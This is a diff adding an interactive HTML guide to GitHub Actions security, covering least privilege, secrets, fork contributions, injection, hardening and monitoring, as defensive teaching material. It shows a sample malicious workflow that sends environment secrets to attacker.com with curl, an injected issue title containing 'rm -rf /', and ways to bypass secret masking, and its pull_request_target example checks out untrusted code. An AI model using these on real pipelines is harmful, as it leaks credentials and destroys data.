@@ -1,0 +1,893 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GitHub Actions Advanced Security Guide</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            color: white;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .header p {
+            font-size: 1.2em;
+            opacity: 0.9;
+        }
+
+        .nav-tabs {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .tab-button {
+            padding: 12px 24px;
+            background: rgba(255,255,255,0.1);
+            border: 2px solid rgba(255,255,255,0.3);
+            color: white;
+            cursor: pointer;
+            border-radius: 25px;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+            font-weight: 500;
+        }
+
+        .tab-button:hover {
+            background: rgba(255,255,255,0.2);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+
+        .tab-button.active {
+            background: rgba(255,255,255,0.3);
+            border-color: rgba(255,255,255,0.6);
+        }
+
+        .content-area {
+            background: rgba(255,255,255,0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .security-concept {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            border-left: 5px solid #dc2626;
+            padding: 25px;
+            margin: 25px 0;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+        }
+
+        .security-concept h3 {
+            color: #dc2626;
+            margin-bottom: 15px;
+            font-size: 1.3em;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .security-icon {
+            width: 24px;
+            height: 24px;
+            background: #dc2626;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 0.8em;
+        }
+
+        .code-block {
+            background: #1e1e1e;
+            color: #d4d4d4;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+            overflow-x: auto;
+            font-family: 'Consolas', 'Monaco', monospace;
+            position: relative;
+        }
+
+        .code-block::before {
+            content: attr(data-lang);
+            position: absolute;
+            top: 5px;
+            right: 10px;
+            background: rgba(255,255,255,0.1);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.8em;
+            color: #888;
+        }
+
+        .good-practice {
+            background: linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%);
+            border-left: 5px solid #10b981;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+        }
+
+        .bad-practice {
+            background: linear-gradient(135deg, #fee2e2 0%, #fecaca 100%);
+            border-left: 5px solid #ef4444;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+        }
+
+        .warning-box {
+            background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%);
+            border-left: 5px solid #f59e0b;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+        }
+
+        .checklist {
+            background: #f1f5f9;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+
+        .checklist-item {
+            display: flex;
+            align-items: flex-start;
+            margin: 10px 0;
+            cursor: pointer;
+        }
+
+        .checklist-item input {
+            margin-right: 12px;
+            margin-top: 2px;
+        }
+
+        .scenario-box {
+            background: linear-gradient(135deg, #e0f2fe 0%, #b3e5fc 100%);
+            border-radius: 12px;
+            padding: 25px;
+            margin: 20px 0;
+            border-left: 5px solid #0288d1;
+        }
+
+        .interactive-demo {
+            background: #f8fafc;
+            border: 2px dashed #cbd5e0;
+            border-radius: 12px;
+            padding: 25px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .demo-button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            margin: 10px;
+        }
+
+        .demo-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+
+        .vulnerability-example {
+            background: linear-gradient(135deg, #fef2f2 0%, #fde8e8 100%);
+            border: 2px solid #fca5a5;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        h2 {
+            color: #1e40af;
+            margin-bottom: 20px;
+            font-size: 1.8em;
+        }
+
+        h4 {
+            color: #374151;
+            margin: 20px 0 10px 0;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #e5e7eb;
+            border-radius: 3px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #10b981, #059669);
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔒 GitHub Actions Advanced Security</h1>
+            <p>Master secure automation practices and protect your workflows from common vulnerabilities</p>
+        </div>
+
+        <div class="nav-tabs">
+            <button class="tab-button active" onclick="showTab('fundamentals')">Security Fundamentals</button>
+            <button class="tab-button" onclick="showTab('secrets')">Secrets Management</button>
+            <button class="tab-button" onclick="showTab('permissions')">Permission Models</button>
+            <button class="tab-button" onclick="showTab('vulnerabilities')">Common Vulnerabilities</button>
+            <button class="tab-button" onclick="showTab('hardening')">Workflow Hardening</button>
+            <button class="tab-button" onclick="showTab('monitoring')">Security Monitoring</button>
+        </div>
+
+        <div class="content-area">
+            <div id="fundamentals" class="tab-content active">
+                <h2>Security Fundamentals</h2>
+
+                <div class="security-concept">
+                    <h3><span class="security-icon">1</span>Understanding the Attack Surface</h3>
+                    <p>GitHub Actions workflows run in ephemeral virtual machines, but they have access to powerful capabilities that attackers can exploit. Think of each workflow as a temporary server that can read your code, access your secrets, and potentially modify your repository or deploy to your infrastructure.</p>
+
+                    <h4>Key Attack Vectors:</h4>
+                    <p>The most dangerous attacks often come from code injection through user-controlled inputs, malicious pull requests that modify workflows, compromised third-party actions, and overprivileged tokens that give workflows more access than they need.</p>
+                </div>
+
+                <div class="scenario-box">
+                    <h4>🎯 Real-World Scenario</h4>
+                    <p>Imagine you have a workflow that automatically deploys when someone pushes to main. An attacker submits a pull request that modifies your workflow file to include a step that exfiltrates your AWS credentials. If you merge without careful review, your next deployment will leak your production secrets.</p>
+                </div>
+
+                <div class="security-concept">
+                    <h3><span class="security-icon">2</span>The Principle of Least Privilege</h3>
+                    <p>Every workflow should have the minimum permissions necessary to accomplish its task. This is your first and most important line of defense. Instead of granting broad access and hoping nothing goes wrong, start with no permissions and add only what you need.</p>
+
+                    <div class="code-block" data-lang="yaml">
+name: Secure Example
+on: [push]
+
+permissions:
+  contents: read    # Only read access to repository contents
+  pull-requests: write  # Only write access to PR comments
+  # No other permissions granted
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run tests
+        run: npm test</div>
+                </div>
+
+                <div class="warning-box">
+                    <h4>⚠️ Common Misconception</h4>
+                    <p>Many developers think that because workflows run in isolated environments, security isn't a major concern. However, these environments have network access, can install software, and often have access to sensitive secrets and tokens that can be used to compromise your entire infrastructure.</p>
+                </div>
+            </div>
+
+            <div id="secrets" class="tab-content">
+                <h2>Advanced Secrets Management</h2>
+
+                <div class="security-concept">
+                    <h3><span class="security-icon">🔑</span>Secret Scope and Inheritance</h3>
+                    <p>Understanding how secrets flow through your organization is crucial for maintaining security. Secrets can be defined at the organization, repository, or environment level, and they inherit in a specific hierarchy that you need to understand to prevent accidental exposure.</p>
+
+                    <h4>Secret Hierarchy (highest to lowest priority):</h4>
+                    <p>Environment secrets override repository secrets, which override organization secrets. This means a malicious repository could potentially override organization-wide security policies if you're not careful about environment configuration.</p>
+                </div>
+
+                <div class="good-practice">
+                    <h4>🟢 Best Practice: Environment-Specific Secrets</h4>
+                    <div class="code-block" data-lang="yaml">
+name: Secure Deployment
+on: [push]
+
+jobs:
+  deploy-staging:
+    runs-on: ubuntu-latest
+    environment: staging  # This ensures only staging secrets are accessible
+    if: github.ref == 'refs/heads/develop'
+    steps:
+      - name: Deploy to staging
+        env:
+          API_KEY: ${{ secrets.STAGING_API_KEY }}  # Only staging key is available
+        run: deploy.sh
+
+  deploy-production:
+    runs-on: ubuntu-latest
+    environment: production  # Different environment = different secrets
+    if: github.ref == 'refs/heads/main'
+    needs: [security-scan]  # Require security scan to pass first
+    steps:
+      - name: Deploy to production
+        env:
+          API_KEY: ${{ secrets.PROD_API_KEY }}  # Production key only in production
+        run: deploy.sh</div>
+                </div>
+
+                <div class="bad-practice">
+                    <h4>🔴 Dangerous Pattern: Secret Leakage</h4>
+                    <div class="code-block" data-lang="yaml">
+# This is vulnerable to secret exposure
+- name: Debug environment
+  run: |
+    echo "Debug info: ${{ secrets.API_KEY }}"  # Secret in logs!
+    env  # This prints ALL environment variables including secrets!</div>
+                </div>
+
+                <div class="security-concept">
+                    <h3><span class="security-icon">🛡️</span>Secret Masking and Detection</h3>
+                    <p>GitHub automatically masks known secret patterns in logs, but this protection isn't foolproof. Attackers can use encoding, environment variable manipulation, or creative output formatting to bypass secret masking and expose your sensitive data.</p>
+
+                    <div class="vulnerability-example">
+                        <h4>Bypassing Secret Masking</h4>
+                        <div class="code-block" data-lang="yaml">
+# These techniques can bypass secret masking:
+- name: Encoded secret exposure
+  run: |
+    echo ${{ secrets.API_KEY }} | base64  # Base64 encoding bypasses masking
+
+- name: Character manipulation
+  run: |
+    echo "${{ secrets.API_KEY }}" | rev  # Reversing string bypasses masking
+
+- name: File-based leakage
+  run: |
+    echo "${{ secrets.API_KEY }}" > /tmp/secret.txt
+    cat /tmp/secret.txt  # File contents might not be masked</div>
+                    </div>
+                </div>
+
+                <div class="checklist">
+                    <h4>🔍 Secrets Security Checklist</h4>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="secret1">
+                        <label for="secret1">Use environment-specific secrets instead of generic ones</label>
+                    </div>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="secret2">
+                        <label for="secret2">Regularly rotate all secrets and API keys</label>
+                    </div>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="secret3">
+                        <label for="secret3">Never echo secrets directly in run commands</label>
+                    </div>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="secret4">
+                        <label for="secret4">Use short-lived tokens instead of long-lived credentials when possible</label>
+                    </div>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="secret5">
+                        <label for="secret5">Implement secret scanning in your repository</label>
+                    </div>
+                </div>
+            </div>
+
+            <div id="permissions" class="tab-content">
+                <h2>Advanced Permission Models</h2>
+
+                <div class="security-concept">
+                    <h3><span class="security-icon">🎯</span>GITHUB_TOKEN Deep Dive</h3>
+                    <p>The GITHUB_TOKEN is automatically created for each workflow run, but its permissions can be customized at multiple levels. Understanding exactly what permissions your token has is critical because this token can be used to make API calls on behalf of your workflow.</p>
+
+                    <div class="code-block" data-lang="yaml">
+# Repository-level default permissions (in .github/workflows/config.yml)
+permissions:
+  contents: read          # Default: read
+  metadata: read         # Always available
+  packages: read         # For package registries
+  pull-requests: write   # To comment on PRs
+  issues: write         # To create/update issues
+  actions: none         # Disable access to Actions API
+  checks: none          # Disable check runs/suites
+  deployments: none     # Disable deployment API
+  security-events: write # For CodeQL/security scanning</div>
+                </div>
+
+                <div class="scenario-box">
+                    <h4>🚨 Permission Escalation Attack</h4>
+                    <p>An attacker submits a PR that adds a new workflow file with broad permissions. The workflow appears innocent but actually uses those permissions to create new secrets, modify branch protection rules, or even create new admin users in your organization. This is why workflow file changes should always be carefully reviewed.</p>
+                </div>
+
+                <div class="security-concept">
+                    <h3><span class="security-icon">🔒</span>Restricting Fork Contributions</h3>
+                    <p>One of the most dangerous attack vectors comes from forked repositories. When external contributors submit pull requests, their workflows could potentially access your secrets or gain elevated permissions. You need to understand how to safely handle contributions from untrusted sources.</p>
+
+                    <div class="code-block" data-lang="yaml">
+name: Safe PR Validation
+on:
+  pull_request_target:  # Dangerous - runs in context of base repo
+    types: [opened, synchronize]
+
+jobs:
+  # This job runs safely - no secrets access for untrusted PRs
+  validate-pr:
+    runs-on: ubuntu-latest
+    if: github.event.pull_request.head.repo.full_name != github.repository
+    permissions:
+      contents: read     # Minimal permissions for untrusted code
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}  # Checkout PR code
+      - name: Run security scan
+        run: |
+          # Run static analysis, dependency checking, etc.
+          npm audit
+
+  # This job runs only for trusted contributors
+  full-ci:
+    runs-on: ubuntu-latest
+    if: github.event.pull_request.head.repo.full_name == github.repository
+    permissions:
+      contents: read
+      checks: write
+    env:
+      API_KEY: ${{ secrets.API_KEY }}  # Secrets only for trusted PRs
+    steps:
+      - uses: actions/checkout@v4
+      - name: Full test suite
+        run: npm test</div>
+                </div>
+
+                <div class="warning-box">
+                    <h4>⚠️ Critical Distinction</h4>
+                    <p><code>pull_request</code> events run in the context of the fork (safer but limited), while <code>pull_request_target</code> events run in the context of the base repository (more dangerous but has access to secrets). Choose carefully based on what your workflow needs to accomplish.</p>
+                </div>
+
+                <div class="interactive-demo">
+                    <h4>🧪 Permission Calculator</h4>
+                    <p>Click to see the minimum permissions needed for common workflows:</p>
+                    <button class="demo-button" onclick="showPermissions('test')">Test Runner</button>
+                    <button class="demo-button" onclick="showPermissions('deploy')">Deployment</button>
+                    <button class="demo-button" onclick="showPermissions('release')">Release Manager</button>
+                    <div id="permission-result" style="margin-top: 20px; padding: 15px; background: #f3f4f6; border-radius: 8px; display: none;"></div>
+                </div>
+            </div>
+
+            <div id="vulnerabilities" class="tab-content">
+                <h2>Common Vulnerabilities & Exploits</h2>
+
+                <div class="vulnerability-example">
+                    <h3>🎯 Code Injection Attack</h3>
+                    <p>This is the most common and dangerous vulnerability in GitHub Actions. It occurs when user-controlled input is directly interpolated into shell commands without proper sanitization.</p>
+
+                    <h4>Vulnerable Code:</h4>
+                    <div class="code-block" data-lang="yaml">
+name: Vulnerable Workflow
+on:
+  issues:
+    types: [opened]
+
+jobs:
+  process-issue:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Process issue title
+        run: |
+          echo "Processing: ${{ github.event.issue.title }}"
+          # If issue title is: "; rm -rf / #" this becomes dangerous!</div>
+
+                    <h4>Secure Alternative:</h4>
+                    <div class="code-block" data-lang="yaml">
+name: Secure Workflow
+on:
+  issues:
+    types: [opened]
+
+jobs:
+  process-issue:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Process issue title safely
+        env:
+          ISSUE_TITLE: ${{ github.event.issue.title }}  # Use environment variable
+        run: |
+          echo "Processing: $ISSUE_TITLE"  # Safe - no direct interpolation</div>
+                </div>
+
+                <div class="vulnerability-example">
+                    <h3>🔓 Privileged Workflow Hijacking</h3>
+                    <p>Attackers can modify workflow files in pull requests to gain elevated permissions or access secrets they shouldn't have access to.</p>
+
+                    <h4>Attack Scenario:</h4>
+                    <div class="code-block" data-lang="yaml">
+# Attacker submits PR with this malicious workflow
+name: "Innocent Test"
+on: [pull_request]
+
+permissions:
+  contents: write      # Escalated permissions
+  actions: write       # Can modify other workflows
+  secrets: write       # Can create new secrets
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "Run tests"
+        run: |
+          # Actually exfiltrates secrets and creates backdoors
+          curl -X POST https://attacker.com/steal -d "$(env)"</div>
+
+                    <h4>Protection Strategy:</h4>
+                    <div class="good-practice">
+                        <p>Implement branch protection rules that require review for workflow file changes, use CODEOWNERS to ensure security team reviews workflow modifications, and consider using separate workflows for untrusted contributions that run with minimal permissions.</p>
+                    </div>
+                </div>
+
+                <div class="vulnerability-example">
+                    <h3>🏴‍☠️ Dependency Confusion Attack</h3>
+                    <p>Attackers can create malicious packages with the same names as your internal packages, causing workflows to download and execute malicious code.</p>
+
+                    <div class="code-block" data-lang="yaml">
+# Vulnerable: Uses default package registries
+- name: Install dependencies
+  run: |
+    npm install my-internal-package  # Could install malicious public package!
+
+# Secure: Explicitly specify registry and verify integrity
+- name: Install dependencies securely
+  run: |
+    npm install my-internal-package --registry=https://npm.company.com
+    npm audit signatures  # Verify package integrity</div>
+                </div>
+
+                <div class="checklist">
+                    <h4>🛡️ Vulnerability Prevention Checklist</h4>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="vuln1">
+                        <label for="vuln1">Never use direct interpolation of user input in run commands</label>
+                    </div>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="vuln2">
+                        <label for="vuln2">Always pin action versions to specific commit SHAs</label>
+                    </div>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="vuln3">
+                        <label for="vuln3">Require code review for all workflow file changes</label>
+                    </div>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="vuln4">
+                        <label for="vuln4">Use environment variables for untrusted input</label>
+                    </div>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="vuln5">
+                        <label for="vuln5">Implement dependency verification and auditing</label>
+                    </div>
+                </div>
+            </div>
+
+            <div id="hardening" class="tab-content">
+                <h2>Workflow Hardening Techniques</h2>
+
+                <div class="security-concept">
+                    <h3><span class="security-icon">🔒</span>Action Pinning and Verification</h3>
+                    <p>Using third-party actions introduces supply chain risks. The most secure approach is to pin actions to specific commit SHAs rather than tags, which can be moved by attackers. Additionally, you should verify the integrity of actions before using them.</p>
+
+                    <div class="code-block" data-lang="yaml">
+# Insecure: Uses mutable tag
+- uses: actions/checkout@v4
+
+# More secure: Pin to specific commit
+- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
+
+# Most secure: Pin and verify with hash
+- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+  # Verified commit hash for v4.1.1 - prevents tampering</div>
+                </div>
+
+                <div class="security-concept">
+                    <h3><span class="security-icon">🏰</span>Network Security Controls</h3>
+                    <p>Workflows have full internet access by default, which creates opportunities for data exfiltration and malicious downloads. You can implement network controls to limit what your workflows can access.</p>
+
+                    <div class="code-block" data-lang="yaml">
+name: Network-Hardened Workflow
+on: [push]
+
+jobs:
+  secure-build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+
+      # Block outbound network access except for approved domains
+      - name: Configure network restrictions
+        run: |
+          # Create iptables rules to block unauthorized network access
+          sudo iptables -A OUTPUT -d api.github.com -j ACCEPT
+          sudo iptables -A OUTPUT -d registry.npmjs.org -j ACCEPT
+          sudo iptables -A OUTPUT -d your-company-api.com -j ACCEPT
+          sudo iptables -A OUTPUT -j REJECT
+
+      - name: Build with restricted network
+        run: |
+          npm ci  # Only allowed registries accessible
+          npm run build</div>
+                </div>
+
+                <div class="security-concept">
+                    <h3><span class="security-icon">📋</span>Runtime Security Monitoring</h3>
+                    <p>Implement monitoring within your workflows to detect suspicious activity. This includes monitoring for unexpected network connections, file system changes, and process execution.</p>
+
+                    <div class="code-block" data-lang="yaml">
+- name: Security monitoring setup
+  run: |
+    # Monitor network connections
+    netstat -tuln > /tmp/initial_connections.txt
+
+    # Monitor running processes
+    ps aux > /tmp/initial_processes.txt
+
+    # Set up file integrity monitoring
+    find /home/runner -type f -exec sha256sum {} \; > /tmp/file_hashes.txt
+
+- name: Run application build
+  run: |
+    npm ci
+    npm run build
+    npm test
+
+- name: Security monitoring check
+  run: |
+    # Check for suspicious network activity
+    netstat -tuln > /tmp/final_connections.txt
+    if ! diff -q /tmp/initial_connections.txt /tmp/final_connections.txt; then
+      echo "⚠️ Network connections changed during build"
+      diff /tmp/initial_connections.txt /tmp/final_connections.txt
+    fi
+
+    # Check for unauthorized processes
+    ps aux > /tmp/final_processes.txt
+    # Add process monitoring logic here</div>
+                </div>
+
+                <div class="good-practice">
+                    <h4>🛡️ Defense in Depth Strategy</h4>
+                    <p>Layer multiple security controls to create a robust defense. Even if one control fails, others should prevent or detect the attack. This includes input validation, permission restrictions, network controls, monitoring, and regular security audits of your workflow configurations.</p>
+                </div>
+            </div>
+
+            <div id="monitoring" class="tab-content">
+                <h2>Security Monitoring & Incident Response</h2>
+
+                <div class="security-concept">
+                    <h3><span class="security-icon">📊</span>Audit Logging and Analysis</h3>
+                    <p>GitHub provides comprehensive audit logs for Actions, but you need to know what to look for and how to analyze them effectively. Key indicators include unusual permission escalations, unexpected secret access, and workflows running from unusual sources.</p>
+
+                    <div class="code-block" data-lang="bash">
+# Using GitHub CLI to analyze audit logs
+gh api /orgs/YOUR_ORG/audit-log \
+  --jq '.[] | select(.action | startswith("workflows")) |
+  {timestamp: .timestamp, action: .action, actor: .actor,
+   repository: .repository}' \
+  > workflow_audit.json
+
+# Look for suspicious patterns:
+# - Workflows with elevated permissions
+# - Secret access from unexpected repositories
+# - Actions from external contributors with sensitive permissions</div>
+                </div>
+
+                <div class="security-concept">
+                    <h3><span class="security-icon">🚨</span>Automated Security Alerts</h3>
+                    <p>Set up automated monitoring to detect security issues in real-time. This includes monitoring for new secrets being created, workflow files being modified, and unusual activity patterns.</p>
+
+                    <div class="code-block" data-lang="yaml">
+name: Security Monitoring
+on:
+  schedule:
+    - cron: '0 */4 * * *'  # Every 4 hours
+  workflow_dispatch:
+
+jobs:
+  security-scan:
+    runs-on: ubuntu-latest
+    permissions:
+      security-events: write
+      contents: read
+    steps:
+      - name: Scan for security issues
+        run: |
+          # Check for hardcoded secrets in workflow files
+          find .github/workflows -name "*.yml" -o -name "*.yaml" | \
+          xargs grep -l "password\|secret\|key\|token" || true
+
+          # Alert on suspicious permission escalations
+          find .github/workflows -name "*.yml" -o -name "*.yaml" | \
+          xargs grep -l "permissions:" | \
+          xargs grep -A 10 "permissions:" | \
+          grep -E "(write|admin)" && echo "⚠️ Found elevated permissions"
+
+      - name: Send security alerts
+        if: failure()
+        run: |
+          # Send notification to security team
+          curl -X POST "${{ secrets.SLACK_WEBHOOK }}" \
+            -H 'Content-type: application/json' \
+            --data '{"text":"🚨 Security scan detected issues in workflows"}'</div>
+
+                <div class="checklist">
+                    <h4>📋 Security Monitoring Checklist</h4>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="monitor1">
+                        <label for="monitor1">Set up automated security scanning of workflow files</label>
+                    </div>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="monitor2">
+                        <label for="monitor2">Monitor audit logs for unusual Actions activity</label>
+                    </div>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="monitor3">
+                        <label for="monitor3">Implement alerting for new secrets or permission changes</label>
+                    </div>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="monitor4">
+                        <label for="monitor4">Regular security reviews of all workflow configurations</label>
+                    </div>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="monitor5">
+                        <label for="monitor5">Incident response plan for compromised workflows</label>
+                    </div>
+                </div>
+
+                <div class="scenario-box">
+                    <h4>🚨 Incident Response Plan</h4>
+                    <p>When you detect a security incident in your GitHub Actions, your response speed is critical. First, immediately disable the compromised workflow to prevent further damage. Next, rotate any secrets that may have been exposed, review audit logs to understand the scope of the breach, and analyze the attack vector to prevent future incidents. Finally, implement additional security controls based on lessons learned from the incident.</p>
+                </div>
+
+                <div class="progress-bar">
+                    <div class="progress-fill" id="security-progress"></div>
+                </div>
+                <p style="text-align: center; margin-top: 10px; color: #6b7280;">Complete the checklists above to track your security implementation progress</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Function to handle tab switching - this was missing!
+        function showTab(tabName) {
+            // Hide all tab content
+            const tabContents = document.querySelectorAll('.tab-content');
+            tabContents.forEach(tab => {
+                tab.classList.remove('active');
+            });
+
+            // Remove active class from all tab buttons
+            const tabButtons = document.querySelectorAll('.tab-button');
+            tabButtons.forEach(button => {
+                button.classList.remove('active');
+            });
+
+            // Show the selected tab content
+            document.getElementById(tabName).classList.add('active');
+
+            // Add active class to the clicked button
+            event.target.classList.add('active');
+        }
+
+        // Function to show permission examples
+        function showPermissions(workflowType) {
+            const resultDiv = document.getElementById('permission-result');
+            let permissionText = '';
+
+            switch(workflowType) {
+                case 'test':
+                    permissionText = `
+                        <h4>Test Runner Permissions</h4>
+                        <div class="code-block" data-lang="yaml">
+permissions:
+  contents: read        # Read source code
+  pull-requests: write  # Comment on PRs with test results
+  checks: write        # Create check runs for test status</div>
+                        <p>This minimal set allows running tests and reporting results without access to secrets or deployment capabilities.</p>
+                    `;
+                    break;
+                case 'deploy':
+                    permissionText = `
+                        <h4>Deployment Permissions</h4>
+                        <div class="code-block" data-lang="yaml">
+permissions:
+  contents: read        # Read source code
+  deployments: write    # Create deployment status
+  actions: read        # Read other workflow artifacts if needed</div>
+                        <p>Deployment workflows need minimal GitHub permissions but rely on external secrets for cloud provider access.</p>
+                    `;
+                    break;
+                case 'release':
+                    permissionText = `
+                        <h4>Release Manager Permissions</h4>
+                        <div class="code-block" data-lang="yaml">
+permissions:
+  contents: write       # Create releases and tags
+  pull-requests: write  # Update PR descriptions
+  issues: write        # Close issues mentioned in release</div>
+                        <p>Release workflows need broader permissions to manage repository state and communicate with users.</p>
+                    `;
+                    break;
+            }
+
+            resultDiv.innerHTML = permissionText;
+            resultDiv.style.display = 'block';
+        }
+
+        // Function to update progress bar based on completed checkboxes
+        function updateProgress() {
+            const checkboxes = document.querySelectorAll('input[type="checkbox"]');
+            const checkedBoxes = document.querySelectorAll('input[type="checkbox"]:checked');
+            const progressPercentage = (checkedBoxes.length / checkboxes.length) * 100;
+
+            const progressBar = document.getElementById('security-progress');
+            if (progressBar) {
+                progressBar.style.width = progressPercentage + '%';
+            }
+        }
+
+        // Add event listeners to all checkboxes to update progress
+        document.addEventListener('DOMContentLoaded', function() {
+            const checkboxes = document.querySelectorAll('input[type="checkbox"]');
+            checkboxes.forEach(checkbox => {
+                checkbox.addEventListener('change', updateProgress);
+            });
+        });
+    </script>
+</body>
+</html>
